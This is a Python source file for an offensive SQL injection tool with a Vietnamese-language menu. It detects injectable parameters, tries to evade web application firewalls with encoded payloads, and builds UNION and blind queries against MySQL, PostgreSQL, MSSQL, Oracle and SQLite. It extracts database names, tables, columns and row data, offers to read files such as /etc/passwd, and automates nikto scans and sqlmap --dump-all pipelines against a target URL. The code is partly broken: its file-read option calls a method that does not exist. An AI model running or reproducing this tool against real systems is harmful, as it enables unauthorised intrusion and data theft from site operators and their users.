#!/usr/bin/env python3
"""
SQLi HUNTER ULTRA v3.0 - Full Exploitation Suite + Nikto & sqlmap Integration
Cần cài đặt: nikto (apt install nikto), sqlmap (apt install sqlmap), python3-requests, python3-bs4
"""
import re, sys, os, time, string, argparse, subprocess, shutil, json, random
import requests
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode
from bs4 import BeautifulSoup

# ================= CẤU HÌNH =================
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml",
}
TIMEOUT = 10
DELAY = 0.3
PROXY = None
REPORT_DIR = "reports"

C = {"R": "\033[91m", "G": "\033[92m", "Y": "\033[93m", "B": "\033[94m", "M": "\033[95m", "W": "\033[0m"}

def banner():
    print(f"""{C['R']}
  ██████╗ ██╗     ██╗   ██╗███╗   ██╗████████╗███████╗██████╗
 ██╔═══██╗██║     ██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
 ██║   ██║██║     ██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
 ██║   ██║██║     ██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
 ╚██████╔╝███████╗╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝{C['W']}
      ULTRA v3.0 — Scanner + Nikto + sqlmap Auto-Exploit
  {'-'*60}""")

def log(msg, level="INFO"):
    colors = {"INFO": C['B'], "OK": C['G'], "WARN": C['Y'], "VULN": C['R'], "DATA": C['M'], "NIKTO": C['M'], "SQLMAP": C['M']}
    print(f"{colors.get(level,'')}[{level:6}]{C['W']} {msg}")

def ensure_dir(d):
    os.makedirs(d, exist_ok=True)

def rand_marker():
    return "".join(random.choice("abcdef0123456789") for _ in range(8))

ERROR_PATTERNS = {
    "mysql":    [r"you have an error in your sql syntax", r"warning: mysql", r"mysqli?_"],
    "mssql":    [r"microsoft sql server", r"unclosed quotation mark", r"\bodbc\b.*driver"],
    "postgres": [r"postgresql.*error", r"unterminated quoted string", r"psql:"],
    "oracle":   [r"\bORA-\d{5}", r"quoted string not properly terminated"],
    "sqlite":   [r"sqlite3?\.\w+error", r"unrecognized token", r"malformed database schema"],
}
TIME_PAYLOADS = {
    "mysql":    ["' AND SLEEP({t})-- -", "' AND BENCHMARK(80000000,SHA1('a'))-- -"],
    "mssql":    ["'; WAITFOR DELAY '0:0:{t}'-- -"],
    "postgres": ["'; SELECT pg_sleep({t})-- -"],
    "oracle":   ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{t})='a'-- -"],
    "sqlite":   ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -"],
}
WAF_BYPASS_ENCODERS = [
    ("raw",            lambda p: p),
    ("comment-space",  lambda p: p.replace(" ", "/**/")),
    ("double-comment", lambda p: p.replace("UNION","UNI/**/ON").replace("SELECT","SE/**/LECT").replace(" ","/**/")),
    ("urlencode",      lambda p: requests.utils.quote(p)),
    ("case-mix",       lambda p: re.sub(r"(union|select|from|and|or)", lambda m: m.group(1).upper() if random.random()<.5 else m.group(1), p, flags=re.I)),
    ("inline-nullbyte",lambda p: p.replace("'", "'%00").replace(" ", "%09")),
]

# ================= CORE ENGINE (giữ nguyên từ v2, rút gọn phần scan/exploit) =================
class SQLiPro:
    def __init__(self, url, cookie=None):
        self.url = url
        self.s = requests.Session()
        self.s.headers.update(HEADERS)
        if cookie: self.s.headers["Cookie"] = cookie
        if PROXY: self.s.proxies = {"http": PROXY, "https": PROXY}
        self.s.verify = False
        self.findings = []
        self.current = None
        self.dbms = None
        self.encoder = WAF_BYPASS_ENCODERS[0]
        self.ncols = None
        self.colpos = None
        ensure_dir(REPORT_DIR)

    def req(self, url, data=None, method="GET"):
        time.sleep(DELAY)
        try:
            return self.s.post(url, data=data, timeout=TIMEOUT) if method == "POST" \
                else self.s.get(url, timeout=TIMEOUT)
        except requests.RequestException as e:
            log(f"Lỗi: {e}", "WARN"); return None

    def inject(self, target, payload):
        self.current = target
        t = target
        if t["method"] == "POST":
            d = dict(t["data"]); d[t["param"]] = t["base"] + payload
            return self.req(t["url"], data=d, method="POST")
        qs = dict(parse_qsl(urlparse(t["url"]).query))
        qs[t["param"]] = t["base"] + payload
        u = urlparse(t["url"])
        return self.req(f"{u.scheme}://{u.netloc}{u.path}?{urlencode(qs)}")

    def send(self, payload):
        if self.encoder: payload = self.encoder[1](payload)
        return self.inject(self.current, payload)

    def extract_params(self):
        targets = []
        if urlparse(self.url).query:
            for p, v in parse_qsl(urlparse(self.url).query):
                targets.append({"url": self.url, "param": p, "base": v, "method": "GET", "data": None})
        r = self.req(self.url)
        if r:
            for form in BeautifulSoup(r.text, "html.parser").find_all("form"):
                action = urljoin(self.url, form.get("action") or self.url)
                fields = {i.get("name"): (i.get("value") or "test") for i in form.find_all("input")
                          if i.get("name") and i.get("type") != "submit"}
                for p in fields:
                    targets.append({"url": action, "param": p, "base": fields[p], "method": "POST", "data": fields})
        return targets

    def detect_dbms(self, text):
        for dbms, pats in ERROR_PATTERNS.items():
            for p in pats:
                if re.search(p, text, re.I): return dbms
        return None

    def detect(self, target):
        base_r = self.req(target["url"], data=target["data"], method=target["method"])
        if not base_r: return None
        for quote in ["'", '"', "')"]:
            r = self.inject(target, quote)
            if r and (dbms := self.detect_dbms(r.text)):
                return {"type": "error-based", "dbms": dbms}
        rt = self.inject(target, "' AND 1=1-- -")
        rf = self.inject(target, "' AND 1=2-- -")
        if rt and rf and rt.text != rf.text:
            return {"type": "boolean-based", "dbms": None}
        for dbms, pls in TIME_PAYLOADS.items():
            for pl in pls:
                t0 = time.time()
                r = self.inject(target, pl.format(t=6))
                if r and time.time() - t0 > 5:
                    return {"type": "time-based", "dbms": dbms}
        return None

    def waf_bypass(self):
        r = self.inject(self.current, "' UNION SELECT NULL-- -")
        markers = ["cloudflare","mod_security","forbidden","sucuri","imperva","akamai","blocked","firewall"]
        if r and not any(m in r.text.lower() for m in markers):
            self.encoder = WAF_BYPASS_ENCODERS[0]
            return True
        for name, enc in WAF_BYPASS_ENCODERS[1:]:
            self.encoder = (name, enc)
            r = self.send("' UNION SELECT NULL-- -")
            if r and not any(m in r.text.lower() for m in markers):
                log(f"Bypass WAF: {name}", "OK"); return True
        self.encoder = WAF_BYPASS_ENCODERS[0]
        return False

    def find_union(self):
        for n in range(1, 51):
            r = self.send(f"' ORDER BY {n}-- -")
            if r and (self.detect_dbms(r.text) or "unknown column" in r.text.lower()):
                self.ncols = n - 1; break
        else:
            for n in range(1, 51):
                r = self.send(f"' UNION SELECT {','.join(['NULL']*n)}-- -")
                if r and not self.detect_dbms(r.text):
                    self.ncols = n; break
        if not self.ncols: return False
        log(f"Số cột: {self.ncols}", "OK")
        tag = rand_marker()
        for pos in range(self.ncols):
            parts = ["NULL"] * self.ncols
            parts[pos] = f"CONCAT(0x6c61726b7374617274,{tag},0x6c61726b656e64)"
            r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
            if r and tag in r.text:
                self.colpos = pos
                log(f"Cột hiển thị: #{pos+1}", "OK")
                return True
        return False

    def uquery(self, inner):
        parts = ["NULL"] * self.ncols
        parts[self.colpos] = f"CONCAT(0x6c61726b7374617274,IFNULL(({inner}),0x4e554c4c),0x6c61726b656e64)"
        r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
        if not r: return None
        m = re.search(r"larkstart(.*?)larkend", r.text, re.S)
        return m.group(1) if m else None

    def exploit_info(self):
        queries = {
            "mysql":  ["version()","database()","user()","@@hostname"],
            "postgres":["version()","current_database()","current_user","inet_server_addr()::text"],
            "mssql":  ["@@version","DB_NAME()","SYSTEM_USER","@@servername"],
            "oracle": ["(SELECT banner FROM v$version WHERE rownum=1)",
                       "(SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual)","user","'n/a'"],
            "sqlite": ["sqlite_version()","'n/a'","'n/a'","'n/a'"],
        }
        dbms = self.dbms or "mysql"
        log("== DB INFO ==", "VULN")
        for label, expr in zip(["Version","Database","User","Host"], queries[dbms]):
            print(f"  {label:9}: {self.uquery(expr) or 'N/A'}")

    def exploit_dbs(self):
        q = {"mysql":"SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
             "postgres":"SELECT string_agg(datname,',') FROM pg_database",
             "mssql":"SELECT STRING_AGG(name,',') FROM sys.databases"}
        val = self.uquery(q.get(self.dbms or "mysql", q["mysql"]))
        if val: log(f"Databases: {val}", "VULN"); return val.split(",")
        log("Không lấy được danh sách DB.", "WARN")

    def exploit_tables(self, db=None):
        dbms = self.dbms or "mysql"
        if dbms == "mysql":
            where = f"table_schema={db}" if db else "table_schema=database()"
            val = self.uquery(f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE {where}")
        elif dbms == "postgres":
            val = self.uquery("SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'")
        else:
            val = self.uquery("SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'")
        if val: log(f"Tables: {val}", "VULN"); return val.split(",")

    def exploit_columns(self, table):
        val = self.uquery(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'")
        if val: log(f"Columns[{table}]: {val}", "VULN"); return val.split(",")

    def exploit_dump(self, table, cols, limit=20):
        colstr = ",".join(cols[:5])
        sep = "0x3b7c3b" if (self.dbms or "mysql") == "mysql" else "',';','"
        fn = "GROUP_CONCAT({c} SEPARATOR {s})" if (self.dbms or "mysql") == "mysql" else "string_agg({c}::text, {s})"
        inner = f"SELECT {fn.format(c=colstr, s=sep)} FROM {table} LIMIT 1" if self.dbms == "postgres" \
            else f"SELECT GROUP_CONCAT({colstr} SEPARATOR ';|;') FROM (SELECT {colstr} FROM {table} LIMIT {limit}) x"
        val = self.uquery(inner)
        if val:
            log(f"== DUMP {table} ==", "VULN")
            for row in val.split(";|;"):
                print(f"  | {row}")
        else:
            log("Dump fail — dùng sqlmap (menu [20]) để dump mạnh hơn.", "WARN")

# ================= TÍCH HỢP CÔNG CỤ BÊN NGOÀI =================
def tool_exists(name):
    path = shutil.which(name)
    if not path:
        log(f"Không tìm thấy '{name}' trong PATH. Cài: sudo apt install {name}", "WARN")
    return path

def run_nikto(url):
    """Chạy Nikto scan tự động, lưu output vào reports/"""
    if not tool_exists("nikto"): return
    ensure_dir(REPORT_DIR)
    host = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    out = os.path.join(REPORT_DIR, f"nikto_{urlparse(url).netloc}_{int(time.time())}.html")
    log(f"Nikto scan: {host} → {out}", "NIKTO")
    cmd = ["nikto", "-h", host, "-Format", "html", "-o", out, "-Tuning", "1234567890abcde", "-nointeractive"]
    if PROXY:
        cmd += ["-useproxy", PROXY]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
        # In các dòng kết quả quan trọng từ stdout
        for line in (proc.stdout or "").splitlines():
            if re.search(r"\+\s", line):  # các dòng findings của nikto
                print(f"  {C['M']}nikto{C['W']} | {line.strip()}")
        log(f"Nikto hoàn tất. Báo cáo HTML: {out}", "OK")
    except subprocess.TimeoutExpired:
        log("Nikto timeout (30 phút).", "WARN")
    except Exception as e:
        log(f"Nikto error: {e}", "WARN")

def run_nikto_text(url):
    """Nikto dạng text - nhanh, in realtime"""
    if not tool_exists("nikto"): return
    host = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    log(f"Nikto scan (text): {host}", "NIKTO")
    try:
        proc = subprocess.Popen(["nikto", "-h", host, "-nointeractive"],
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            print(f"  {C['M']}nikto{C['W']} | {line.rstrip()}")
        proc.wait()
    except Exception as e:
        log(f"Nikto error: {e}", "WARN")

def build_sqlmap_cmd(url, finding, extra=None):
    """Xây dựng lệnh sqlmap tự động từ finding đã phát hiện"""
    t = finding
    cmd = ["sqlmap", "-u", t["url"], "--batch", "--random-agent", "--threads=4", "--risk=2", "--level=3"]
    if t["method"] == "POST" and t.get("data"):
        cmd += ["--data", urlencode(t["data"]), "-p", t["param"]]
    else:
        cmd += ["-p", t["param"]]
    if t.get("dbms"):
        cmd += ["--dbms", t["dbms"]]
    if PROXY:
        cmd += ["--proxy", PROXY]
    if extra:
        cmd += extra
    return cmd

def run_sqlmap_auto(url, findings, mode="full"):
    """Chạy sqlmap auto theo mode: detect/full (dump)"""
    if not tool_exists("sqlmap"): return
    if not findings:
        log("Không có findings — chạy scan [1] trước, hoặc cho sqlmap tự detect.", "WARN")
    targets = findings or [{"url": url, "param": None, "method": "GET", "data": None, "dbms": None}]
    outdir = os.path.join(REPORT_DIR, f"sqlmap_{int(time.time())}")
    ensure_dir(outdir)
    for t in targets:
        cmd = build_sqlmap_cmd(url, t)
        if mode == "full":
            cmd += ["--dbs", "--output-dir", outdir]
        else:
            cmd += ["--output-dir", outdir]
        if not t.get("param"):
            cmd.remove("-p"); cmd.remove(t["param"])
        log(f"sqlmap mode={mode}: {' '.join(cmd[:8])}...", "SQLMAP")
        try:
            subprocess.run(cmd, timeout=3600)
        except subprocess.TimeoutExpired:
            log("sqlmap timeout (60 phút).", "WARN")
    log(f"Kết quả sqlmap nằm trong: {outdir}", "OK")

def run_sqlmap_pipeline(engine):
    """FULL PIPELINE: engine tự detect → sqlmap dump từng DB tự động"""
    if not tool_exists("sqlmap"): return
    if not engine.findings:
        log("Chưa có findings!", "WARN"); return
    t = engine.findings[0]
    log("=== PIPELINE: Engine detect → sqlmap --dbs → sqlmap dump từng DB ===", "SQLMAP")
    # Bước 1: engine đã biết dbms → đưa sqlmap flags tối ưu
    cmd = build_sqlmap_cmd(t["url"], t, extra=["--dbs", "--threads=6"])
    dbs_raw = subprocess.run(cmd, capture_output=True, text=True, timeout=3600).stdout or ""
    dbs = [l for l in dbs_raw.splitlines() if re.match(r"^\[\*\] ", l)]
    dbs = [re.sub(r"^\[\*\] ", "", d).strip() for d in dbs]
    if not dbs:
        log("sqlmap không list được DBs. Thử dump trực tiếp schema.", "WARN")
        dbs = [None]
    for db in dbs:
        if db:
            log(f"sqlmap dump DB: {db}", "SQLMAP")
            extra = ["-D", db, "--dump-all", "--threads=6"]
        else:
            extra = ["--dump-all", "--threads=6"]
        subprocess.run(build_sqlmap_cmd(t["url"], t, extra=extra), timeout=7200)

# ================= MAIN / MENU =================
def pick_target(targets):
    print(f"\n{C['Y']}-- Chọn target --{C['W']}")
    for i, t in enumerate(targets):
        print(f"  [{i}] {t['method']:4} {t['param'] or '?':15} {t['type'] if 'type' in t else ''}")
    idx = input("Số thứ tự (default 0): ").strip()
    return targets[int(idx) if idx else 0]

def main():
    global PROXY
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("-c", "--cookie")
    parser.add_argument("-p", "--proxy")
    args = parser.parse_args()
    PROXY = args.proxy
    engine = SQLiPro(args.url, cookie=args.cookie)
    banner()
    if not tool_exists("nikto"): log("Nikto bị thiếu — menu Nikto sẽ không chạy.", "WARN")
    if not tool_exists("sqlmap"): log("sqlmap bị thiếu — menu sqlmap sẽ không chạy.", "WARN")

    while True:
        print(f"""
{C['G']}========== SQLi HUNTER ULTRA — MENU =========={C['W']}
--- Scan nội bộ ---
 [1]  Quét SQLi toàn params (engine riêng)
 [2]  Xem findings
--- Khai thác (engine) ---
 [3]  Full auto-exploit chain
 [4]  DB info (version/db/user/host)
 [5]  Liệt kê databases
 [6]  Liệt kê tables
 [7]  Liệt kê columns
 [8]  DUMP data
 [9]  Boolean-blind (query tùy chỉnh)
 [10] Đọc file (LOAD_FILE)
 [11] WAF bypass
 [12] Test payload thủ công
--- Nikto tích hợp ---
 [13] Nikto scan nhanh (realtime text)
 [14] Nikto scan full + xuất báo cáo HTML
--- sqlmap tích hợp ---
 [15] sqlmap auto-detect trên URL chính
 [16] sqlmap auto-exploit trên findings (mỗi param 1 lệnh tối ưu)
 [17] sqlmap FULL PIPELINE: detect → --dbs → dump-all từng DB (TỰ ĐỘNG 100%)
 [18] sqlmap dump thủ công (nhập -D -T -C tùy ý)
--- Tiện ích ---
 [19] Chạy TẤT CẢ tự động: Scan + Nikto + sqlmap pipeline
 [20] Xem báo cáo trong thư mục {REPORT_DIR}/
 [0]  Thoát""")
        ch = input("Chọn: ").strip()

        if ch == "1":
            targets = engine.extract_params()
            log(f"Tìm thấy {len(targets)} param(s)", "OK")
            engine.findings.clear()
            for t in targets:
                res = engine.detect(t)
                if res:
                    t.update(res); engine.findings.append(t)
                    engine.dbms = engine.dbms or res["dbms"]
                    log(f"[!] VULN: {t['param']} → {res['type']} ({res['dbms']})", "VULN")
            if not engine.findings:
                log("Không phát hiện SQLi bằng engine. Thử [15] để sqlmap tự detect.", "WARN")
        elif ch == "2":
            for i, f in enumerate(engine.findings):
                print(f"  [{i}] {f['method']:4} {f['param']:15} {f.get('type','')} {f.get('dbms') or ''}")
        elif ch == "13":
            run_nikto_text(args.url)
        elif ch == "14":
            run_nikto(args.url)
        elif ch == "15":
            run_sqlmap_auto(args.url, [])
        elif ch == "16":
            run_sqlmap_auto(args.url, engine.findings, mode="detect")
        elif ch == "17":
            run_sqlmap_pipeline(engine)
        elif ch == "18":
            if not tool_exists("sqlmap"): continue
            t = pick_target(engine.findings) if engine.findings else None
            if not t:
                log("Cần findings. Hủy.", "WARN"); continue
            db  = input("DB (-D, Enter skip): ").strip()
            tbl = input("Table (-T, Enter skip): ").strip()
            col = input("Column (-C, Enter skip): ").strip()
            extra = ["--dump"]
            if db:  extra += ["-D", db]
            if tbl: extra += ["-T", tbl]
            if col: extra += ["-C", col]
            subprocess.run(build_sqlmap_cmd(t["url"], t, extra=extra), timeout=7200)
        elif ch == "19":
            log("=== CHẠY TẤT CẢ TỰ ĐỘNG ===", "OK")
            # 1. Scan engine
            targets = engine.extract_params()
            for t in targets:
                res = engine.detect(t)
                if res:
                    t.update(res); engine.findings.append(t)
                    engine.dbms = engine.dbms or res["dbms"]
                    log(f"[!] VULN: {t['param']}", "VULN")
            # 2. Nikto (chạy song song - không block)
            nikto_proc = subprocess.Popen(
                ["nikto", "-h", f"{urlparse(args.url).scheme}://{urlparse(args.url).netloc}", "-nointeractive"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) if tool_exists("nikto") else None
            log("Nikto đang chạy nền...", "NIKTO")
            # 3. sqlmap pipeline nếu có findings
            if engine.findings:
                run_sqlmap_pipeline(engine)
            else:
                run_sqlmap_auto(args.url, [], mode="detect")
            # 4. Chờ nikto xong
            if nikto_proc:
                log("Đang chờ Nikto (tối đa 20 phút)...", "NIKTO")
                try:
                    nikto_proc.wait(timeout=1200)
                    log("Nikto xong.", "OK")
                except subprocess.TimeoutExpired:
                    nikto_proc.kill()
            log("=== HOÀN TẤT. Xem reports/ ===", "OK")
        elif ch == "20":
            for root, _, files in os.walk(REPORT_DIR):
                for f in files:
                    print(f"  {os.path.join(root, f)}")
        elif ch in ("3","4","5","6","7","8","9","10","11","12"):
            if not engine.findings:
                log("Chưa có findings — chạy [1] trước.", "WARN"); continue
            t = engine.findings[0] if len(engine.findings) == 1 else pick_target(engine.findings)
            engine.current = t
            if ch == "3":
                r = engine.inject(t, "'"); engine.dbms = engine.detect_dbms(r.text) if r else None
                engine.waf_bypass()
                if engine.find_union(): engine.exploit_info()
            elif ch in ("4","5","6","7","8"):
                if engine.ncols is None and not engine.find_union(): continue
                if ch == "4": engine.exploit_info()
                elif ch == "5": engine.exploit_dbs()
                elif ch == "6":
                    db = input("Tên DB (Enter = current): ").strip()
                    engine.exploit_tables(f"'{db}'" if db else None)
                elif ch == "7":
                    engine.exploit_columns(input("Tên table: ").strip())
                elif ch == "8":
                    tbl = input("Table: ").strip()
                    cols = input("Columns (cách nhau dấu phẩy): ").strip().split(",")
                    engine.exploit_dump(tbl, cols)
            elif ch == "9":
                q = input("Query blind: ").strip()
                charset = string.ascii_letters + string.digits + "@._-{}$!#%^&*()"
                result = ""
                for i in range(1, 200):
                    found = False
                    for c in charset:
                        r1 = engine.send(f"' AND ASCII(SUBSTRING(({q}),{i},1))={ord(c)}-- -")
                        r2 = engine.send(f"' AND ASCII(SUBSTRING(({q}),{i},1))=0-- -")
                        if r1 and r2 and len(r1.text) != len(r2.text):
                            result += c; sys.stdout.write(c); sys.stdout.flush(); found = True; break
                    if not found: break
                print(f"\n  => {result}")
            elif ch == "10":
                engine.exploit_readfile(input("Path (vd /etc/passwd): ").strip())
            elif ch == "11":
                engine.waf_bypass()
            elif ch == "12":
                r = engine.send(input("Payload (nối vào base): ").strip())
                print(r.text[:3000] if r else "No response")
        elif ch == "0":
            sys.exit(0)

if __name__ == "__main__":
    main()
